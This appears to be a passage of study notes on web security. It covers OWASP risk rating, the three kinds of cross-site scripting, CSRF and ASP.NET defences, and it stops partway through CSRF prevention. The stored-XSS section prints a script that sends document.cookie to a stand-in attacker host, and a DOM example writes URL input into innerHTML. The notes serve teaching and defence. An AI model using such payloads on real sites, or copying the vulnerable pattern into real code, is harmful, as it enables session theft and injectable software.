### OWASP
- Open Web Application Security Project (OWASP)
- Non-profit foundation that works to improve the security of software
- Community-led open source software projects
- Source for developers and technologies to secure the web

**OWASP Risk Rating Methodology**
- Risk model: Risk = Likelihood * Impact
	- Step 1: Identifying a risk
		- e.g. OWASP, SANS top 25
	- Step 2: Factors for Estimating Likelihood
		- e.g. Skill level, Motive, Opportunity, Size, Ease of discovery, Ease of Exploit, Awareness, Intrusion detection
	- Step 3: Factors for Estimating Impact
		- e.g. Loss of confidentiality, Loss of integrity, Loss of availability, Loss of accountability, Financial damage, Reputation damage, Non-compliance, Privacy violation
	- Step 4: Determining Severity of the Risk
	- Step 5: Deciding what to Fix 
		- After the risks to the application have been classified there will be a prioritized list of what to fix.
		- As a general rule, the most severe risks should be fixed first.
		- Not all risks are worth fixing.
		- Some loss is not only expected, but justifiable based upon the cost of fixing the issue.
	- Step 6: Customizing your Risk Rating Model
		- Risk ranking should be adapted to your own company purpose and mission

| Likelihood and impact levels| |
|-----------|-------|
|0 to < 3| Low|
|3 to < 6| Medium|
|6 to 9| High|

### Cross-Site Scripting (XSS)
- A client-side code injection attack allowing the injection of malicious code into a website.
- XXS flaws occurs whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript.

**Impacts of XSS**
- Allows attackers to execute scripts in the victim's browser.
	- Steal users cookies, allowing for someone to use the website pretending to be that user.
	- Steal users session, steal sensitive data, rewrite web page, redirect user to phishing or malware site etc.
	- Hijack an account.
	- Spread web worms.
	- Access browser history and clipboard contents.
	- Control the browser remotely.
	- Scan and exploit intranet appliances and applications.

**XSS Prevention**
- **Encoding**
	- Escapes the user input so that the browser interprets it only as data, not as code.
	- e.g. Converting characters like `<` and `>` into `&lt;` and `&gt;`.
- **Validation**
	- Filters the user input so that the browser interprets it as code without malicious commands.
- Configure Web.config file
- The act of filtering user input so that all malicious parts of it are removed, without necessarily removing all code in it.
- Input validation
	- Filter out special characters in HTML body.
	- Check input against a white-list.
	- E.g. Using ASP.NET Validation Server Controls.
- ASP.NET Core and Razor.
	- By default, they save us from the attack.
	- if need to render HTML content, use `@Html.Raw(htmlContent)`

**3 types of XSS**
- **Reflected XSS** (non-persistent), where the malicious string originates from the victim's request. (form field, hidden field, URL, etc...). The website then includes this malicious string in the response sent back to the user.
- **DOM-based XSS**, where the vulnerability is in the client-side code rather than the server-side code.
- **Persistent (Stored) XSS**, where the malicious string originates from the website's database.

**Reflected XSS**
- Script is executed on the victim's side
- Script is NOT stored on the server
- When a user clicks on the URL, it is executed in the user's browser. This type of attack is often used to send personal data of a user back to an attacker. This attack is very simple to exploit, which is one reason it is so popular and effective.
- Injected scripts are reflected off the web server.
	- e.g. error message, search results, or any other response
- e.g. Malicious code hidden inside links and embedded in emails or forum messages.
	- When an unsuspecting user clicks on the link, the malicious code may be executed on the client.
```
<a href="http://example.com/comment.pl?mycomment=<script>malicious code</script>">Click here</a>
```

**Attack explained**
1. Attacker crafts a URL containing a malicious string and sends it to the victim.
2. The victim is tricked by the attacker into requesting the URL from the vulnerable website.
3. The vulnerable website includes the malicious string from the URL in the response.
4. The victim's browser executes the malicious scripts inside the response, sending the victim's cookies to the attacker's server.

**Persistent XSS**
- Injected scripts are stored on vulnerable servers.
- e.g. an attacker might post a message as follows in a forum.
```
Hello message board. This is a message. 
<script>
	document.write("<img src=http://steal.com/xssHack/Steal?"+document.cookie+">")
</script>
This is the end of my message.
```
- When a victim navigates to the forum post, the malicious code may be executed unexpectedly.

**Attack explained**
1. The attacker uses one of the website's forms to insert a malicious string into the website's database.
2. The victim requests a page from the website.
3. The website includes the malicious string from the database in the response and sends it to the victim.
4. The victim's browser executes the malicious script inside the response, sending the victim's cookies to the attacker's server.

**DOM-based XSS**
- The attack payload is executed as a result of modifying the DOM "environment" in the victim's browser so that the client side code runs in an "unexpected" manner.
- Request does not travel to the server but stay at the browser the entire time.
- The application contains client-side js that processes data from an untrusted source in an unsafe way, usually by writing the data to a potentially dangerous sink within in the DOM.
- Source
	- A source is a JS property that contains data that an attack could potentially control.
		- e.g. `location.search`
- Sink 
	- A sink is a function or DOM object that allows JS code execution or rendering of HTML.
		- e.g. `eval()`

```
<html>
You searched for : <em><script>...</script></em>
<script>
var keyword = location.search.substring(6);
document.querySelector('em').innerHTML = keyword;
</script>
</html>
```

**Attack explained**
1. The attacker crafts a URL containing a malicious string and sends it to the victim.
2. The victim is tricked by the attacker into requesting the URL from the website.
3. The website receives the request, but does not include the malicious string in the response.
4. The victim's browser executes the legitimate script inside the response, causing the malicious script to be inserted into the page.
5. The victim's browser executes the malicious script inserted into the page, sending the victim's cookies to the attacker's server.


### Cross-Site Request Forgery (CSRF)
- A client-side attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated.
- XSRF, Sea Surf of Session Riding

**How it works?**
- The attacker will typically use social engineering, such as an email or link that will trick a victim into sending a forger request to a server.
- As the user is already authenticated by their application at the time the attack is happening, it's impossible for the application to differentiate a legitimate request from a forged one.

**Why does this happen?**
- While the evil website can't see your cookies, those cookies associated with your bank are being sent along with the request.

**CSRF vs XSS**
- CSRF is restricted to the actions victims can perform. XSS works on the execution of malicious scripts enlarging the scope of actions the attacker can perform.
- XSS requires only a vulnerability, while CSRF requires a user to access the malicious page or click a link.
- CSRF works only one way - it can only send HTTP requests, but cannot view the response. XSS can send and receive HTTP requests and responses in order to extract the required data.

**CSRF Prevention**
- Use anti-forgery tokens in ASP.NET Core.
- By including anti-forgery tokens in your applications, two different values are sent to the server with each POST.
	- One of the values is sent as a browser cookie.
	- The other is submitted as form data.
- U